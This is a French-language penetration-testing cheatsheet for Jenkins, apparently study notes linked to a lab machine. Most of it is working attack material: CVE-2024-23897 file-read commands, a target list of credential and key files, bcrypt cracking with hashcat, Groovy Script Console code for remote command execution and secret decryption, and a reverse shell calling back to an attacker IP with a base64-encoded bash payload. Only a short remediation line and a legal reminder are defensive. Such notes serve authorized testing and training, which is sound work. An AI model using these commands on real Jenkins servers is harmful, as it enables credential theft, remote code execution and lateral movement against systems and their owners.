# Cheatsheet — Jenkins (pentest)

Jenkins est un serveur d'intégration continue très répandu, souvent exposé en interne avec des **secrets** (clés SSH, tokens, mots de passe de déploiement) et des droits puissants. Deux angles d'attaque majeurs : **CVE-2024-23897** (lecture de fichiers arbitraires non authentifiée) et la **Script Console** (RCE/déchiffrement une fois admin).

**Rappel légal : uniquement sur tes labs et les périmètres autorisés par écrit (art. 323-1 du Code pénal).**

---

## 1. Repérage
```bash
nmap -sC -sV -p- <IP>          # port 8080 typique, title "Dashboard [Jenkins]", header Jetty
```
- **Version** : bas de page de l'UI, ou `http://<IP>:8080/api/json?pretty` / en-tête `X-Jenkins`.
- **< 2.442 (ou LTS < 2.426.3)** → vulnérable **CVE-2024-23897**.

---

## 2. CVE-2024-23897 — lecture de fichiers arbitraires (non authentifiée)

Le CLI Jenkins « expand » l'argument `@fichier` → on lit n'importe quel fichier lisible par le service.

```bash
# récupérer le client officiel (exposé par Jenkins)
wget http://<IP>:8080/jnlpJars/jenkins-cli.jar

# lecture : connect-node interprète CHAQUE LIGNE comme un nom d'agent -> dump ligne par ligne
java -jar jenkins-cli.jar -s http://<IP>:8080/ connect-node "@/etc/passwd" 2>&1

# nettoyer l'affichage
java -jar jenkins-cli.jar -s http://<IP>:8080/ connect-node "@/FICHIER" 2>&1 \
  | sed -E 's/^(.*): No such agent ".*$/\1/'
```

> **`connect-node` vs `help`** : `help @file` ne renvoie que la **1re ligne** et **plante sur les gros fichiers** (« Too many arguments », timeout). `connect-node @file` dump **tout le fichier**. Toujours préférer `connect-node`.
> **Binaires** (`master.key`, `hudson.util.Secret`) → ressortent **illisibles** (ce ne sont pas des lignes de texte).

### Fichiers à lire en priorité
| Fichier | Contenu |
| --- | --- |
| `/var/jenkins_home/users/users.xml` | mapping `user` → `users/<id>` |
| `/var/jenkins_home/users/<id>/config.xml` | `<passwordHash>#jbcrypt:$2a$10$...` (bcrypt) |
| `/var/jenkins_home/config.xml` | securityRealm + authorizationStrategy + version |
| `/var/jenkins_home/credentials.xml` | credentials chiffrés (clé SSH, tokens : `{AQAA...}`) |
| `/var/jenkins_home/secrets/master.key` | clé maître (hex) — pour déchiffrement offline |
| `/var/jenkins_home/secrets/hudson.util.Secret` | 2e élément (binaire) |
| `/etc/passwd`, `/home/<user>/.ssh/id_rsa` | classiques Linux |

### Casser le hash bcrypt
```bash
echo '$2a$10$....' > jen.hash
hashcat -m 3200 jen.hash /usr/share/wordlists/rockyou.txt
```

---

## 3. Comprendre la config de sécurité (config.xml)

| Valeur | Signification offensive |
| --- | --- |
| `HudsonPrivateSecurityRealm` | comptes gérés par Jenkins → bcrypt dans `users/<id>/config.xml` |
| `FullControlOnceLoggedInAuthorizationStrategy` | **tout compte connecté = admin** → Script Console accessible |
| `<useSecurity>false</useSecurity>` | pas d'auth du tout → Script Console en anonyme |

---

## 4. Script Console — RCE et déchiffrement (une fois admin)

`Manage Jenkins → Script Console` (ou `POST /script`). Exécute du **Groovy en tant que l'utilisateur Jenkins**.

```groovy
// RCE directe
println "id".execute().text
println new ProcessBuilder("/bin/bash","-c","id").redirectErrorStream(true).start().text

// Déchiffrer un secret stocké ({AQAA...} de credentials.xml) — Jenkins détient les clés
println(hudson.util.Secret.decrypt('{AQAAABAAAA...}'))

// Lister / déchiffrer tous les credentials
com.cloudbees.plugins.credentials.SystemCredentialsProvider.getInstance().getCredentials().forEach {
  println it.properties
}
```

### Reverse shell via Script Console
```groovy
String host="10.10.14.x"; int port=4444;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
// ... (plomberie flux in/out) — ou plus simple :
println "bash -c {echo,YmFzaCAtaSA+...}|{base64,-d}|{bash,-i}".execute().text
```

---

## 5. Déchiffrement offline des credentials (si pas d'accès Script Console)

Il faut **3 fichiers** : `credentials.xml` (le `{AQAA...}`), `secrets/master.key`, `secrets/hudson.util.Secret`.
```bash
# ex. avec jenkins_offline_decrypt / jenkins-credential-decryptor
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret credentials.xml
```
> Obstacle fréquent : sortir `hudson.util.Secret` (binaire) via une LFbI texte. Si tu as déjà un shell, c'est trivial ; via CVE-2024-23897 seule, préfère la Script Console.

---

## 6. À savoir expliquer à l'oral
- **Pourquoi la lecture de fichier = compromission totale** : les secrets (clés SSH, tokens de déploiement) vivent dans `JENKINS_HOME`, souvent avec des droits root ou des accès à d'autres machines.
- **`connect-node` vs `help`** : même faille, mais `connect-node` dump multi-lignes ; `help` tronque.
- **Chaîne type** : `users.xml` → hash bcrypt → crack → login (admin via la stratégie d'autorisation) → Script Console → déchiffrement du credential → pivot/root.
- **Remédiation** : patcher, désactiver le CLI, autorisation par rôle (jamais FullControlOnceLoggedIn), secrets dans un vault externe.

## Références
- Fiches liées : [hashcat](hashcat.md) · [searchsploit](searchsploit.md) · [reverse-shells](reverse-shells.md)
- Machine : [Builder](../machines/Builder.md) (CVE-2024-23897 → Script Console → root)
